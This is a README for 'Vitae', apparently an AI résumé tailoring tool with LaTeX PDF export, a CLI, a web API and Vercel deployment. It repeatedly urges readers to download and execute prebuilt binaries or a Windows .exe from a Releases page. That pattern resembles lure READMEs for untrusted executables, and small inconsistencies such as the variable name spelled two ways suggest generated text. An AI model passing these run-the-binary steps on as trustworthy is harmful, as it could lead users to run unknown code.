# Vitae — AI Résumé Transformer: LaTeX PDF, Job Fit 🧭✨

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/aaaa2323/vitae/releases)  
https://github.com/aaaa2323/vitae/releases

![Hero image](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1600&q=60)

Table of contents
- About
- Key features
- Demo images
- Installation (download & run)
- Quick start
- CLI reference
- Web UI and API
- LaTeX templates and PDF export
- Parsing & matching details
- Deployment (Vercel)
- Development (TypeScript)
- Security & data flow
- Contributing
- License
- Releases

About
---
Vitae transforms your CV into a tailored résumé for any job. It uses AI to read job descriptions, pick the right skills, and generate a LaTeX resume. It exports high-quality PDF files ready to send to recruiters or upload to job portals. It works as a CLI tool, a simple web UI, and a deployable service.

Key features
---
- AI-driven content selection. The model extracts core skills, impact statements, and keywords that match a target job.
- LaTeX-first export. Produce clean, printable PDFs with professional layouts.
- Resume tailoring. Keep your base CV and generate multiple targeted versions.
- PDF parsing. Read existing PDFs and extract sections to seed edits.
- OpenAI integration. Use an LLM for summarization and matching.
- CLI + Web UI. Run locally or deploy to Vercel for team use.
- TypeScript codebase. Strong types, clear interfaces.
- Open source. Extend templates and parsers.

Demo images
---
Resume layout sample  
![Resume sample 1](https://raw.githubusercontent.com/aaaa2323/vitae/main/assets/samples/resume-classic.png)

LaTeX preview  
![LaTeX preview](https://raw.githubusercontent.com/aaaa2323/vitae/main/assets/samples/latex-preview.png)

Installation (download & run)
---
You can download a release artifact and run it. Visit the release page and choose the artifact that matches your platform. The artifact includes a ready-to-run binary or a packaged Node release. You must download the release file and execute it.

Direct release page (download and run):  
https://github.com/aaaa2323/vitae/releases

Common steps
- Linux / macOS (tar.gz)
  1. Download the archive from the Releases page.
  2. Extract: tar -xzf vitae-vX.Y.Z-linux.tar.gz
  3. Run: ./vitae
- macOS (binary)
  1. Download vitae-macOS-x64
  2. Make executable: chmod +x vitae
  3. Run: ./vitae
- Windows (zip)
  1. Download vitae-win-x64.zip
  2. Unzip and run vitae.exe

If you prefer to build from source, follow the Development section below.

Quick start
---
Create a tailored resume in three steps.

1) Prepare base CV
- Provide a PDF or Markdown CV. The parser reads the file and creates a structured profile.

2) Provide a job description
- Paste the job text or a URL. The tool reads job requirements.

3) Generate and export
- Run the tailor command. Vitae chooses relevant skills, rewrites bullets, and writes a LaTeX file. Then it compiles the PDF.

Example (CLI)
- Parse your CV: vitae parse --input ./cv.pdf --out profile.json
- Tailor for role: vitae tailor --profile profile.json --job job.txt --template classic --out tailored.tex
- Build PDF: vitae build --tex tailored.tex --out tailored.pdf

CLI reference
---
Common commands
- vitae parse --input <file> --out <profile.json>
  - Parse PDF, DOCX, or plain text into a profile JSON.
- vitae tailor --profile <profile.json> --job <job.txt> --out <tailored.tex>
  - Create a tailored LaTeX resume.
- vitae build --tex <file.tex> --out <file.pdf>
  - Compile LaTeX into PDF. Requires a TeX toolchain or bundled latex engine.
- vitae serve --port 3000
  - Start the local web UI.

Flags
- --template <name> — choose a LaTeX template (classic, modern, compact)
- --model <openai|local> — choose model provider
- --max-bullets <n> — limit bullets per section
- --keywords-only — produce a skills-first resume

Web UI and API
---
Vitae includes a lightweight web UI that exposes a simple REST API. You can upload a CV, paste a job description, preview the LaTeX, and export PDF.

Key endpoints
- POST /api/parse — accept file upload, return profile JSON
- POST /api/tailor — accept profile + job, return LaTeX and preview
- GET /api/templates — list available LaTeX templates
- POST /api/build — compile LaTeX into PDF (returns binary)

Authentication
- API keys. Set VITEA_API_KEY to protect endpoints.
- For team use, run behind a reverse proxy or deploy to Vercel with environment secrets.

LaTeX templates and PDF export
---
Vitae ships with several LaTeX templates. Each template focuses on clarity and ATS friendliness.

Templates
- classic — conservative design, two columns, clear headers
- modern — bold headings, skill bars, light accents
- compact — dense layout for single-page resumes

You can add templates in /templates. Each template is a .tex file and a small CSS-like style file for layout options.

PDF build
- The tool can call pdflatex, xelatex, or a bundled micro-TeX engine.
- The build step resolves fonts and packages automatically for included templates.
- For CI or server builds, use the --no-preview flag to skip SVG rendering.

Parsing & matching details
---
Parser
- Converts PDF and DOCX into plain text.
- Extracts header, contact info, experience, education, projects, skills.
- Produces structured JSON that the tailor engine reads.

Matcher
- Tokenizes job text and profile.
- Scores each bullet by relevance to job keywords.
- Ranks skills and suggested changes.
- Generates rewrite prompts for the AI with strict constraints for word count and tense.

AI prompts
- The tool uses controlled prompts that focus on impact, quantifiable results, and ATS keywords.
- Prompts ask the model to prefer active verbs and measurable results.

OpenAI and model options
---
Vitae works with OpenAI and local models. Set provider via config.

Environment variables
- OPENAI_API_KEY — required for OpenAI provider
- VITAE_MODEL — e.g., gpt-4o, gpt-4, gpt-3.5-turbo
- VITAE_MAX_TOKENS — controls response length

If you use OpenAI, the tool sends structured prompts, the profile JSON, and job text. The tool enforces token limits and retries on transient errors.

Deployment (Vercel)
---
Vitae fits well on Vercel for the web UI. The app uses a serverless API to handle parsing and tailor requests. Use the following steps.

1) Clone the repo
2) Set environment variables in Vercel dashboard
- OPENAI_API_KEY
- VITAE_API_KEY
3) Configure build
- Build command: npm run build
- Output directory: build
4) Add a serverless function to handle builds that need a TeX engine, or use an external "build server" for PDF compilation.

Development (TypeScript)
---
The codebase uses TypeScript with strict types. It separates modules for parsing, matching, templating, and export.

Local setup
- Node 18+
- npm install
- cp .env.example .env and set keys
- npm run dev

Key folders
- /src/cli — command line interface
- /src/api — web API handlers
- /src/parser — PDF, DOCX parsers
- /src/matcher — job matching logic
- /templates — LaTeX templates
- /assets — images and icons

Testing
- Unit tests use Jest.
- Integration tests run headless build and compare PDFs via checksum.

Security & data flow
---
- The tool reads local files and sends only the text to the AI provider.
- It strips personally identifying metadata unless you allow full content upload.
- For private data, run the tool locally or deploy within a private VPC.

Contributing
---
We welcome contributions that improve parsing, templates, or model prompts.

How to contribute
- Fork the repo
- Create a feature branch
- Run tests and linting
- Open a pull request describing the change

Guidelines
- Keep commits small and focused.
- Add tests for parser changes.
- Add a template preview image when you add a new template.

Issues
- Report bugs or request features in GitHub Issues.
- Label issues with bug, enhancement, help wanted.

License
---
MIT License. See LICENSE file in the repository.

Releases
---
Get the latest release from the GitHub Releases page. The release artifacts include platform builds and sample templates. Download the artifact that matches your platform and run it as described above.

Access releases here: https://github.com/aaaa2323/vitae/releases

If a release link does not work, check the Releases section on the repository page.

Repository topics
---
ai-resume, career-tools, document-processing, job-applications, latex, openai, oss, pdf-parser, resume-builder, tailored-resume, typescript, vercel

Contact & support
---
Open an issue for bugs. Use pull requests for code changes. For deployment help, open a discussion in the repo.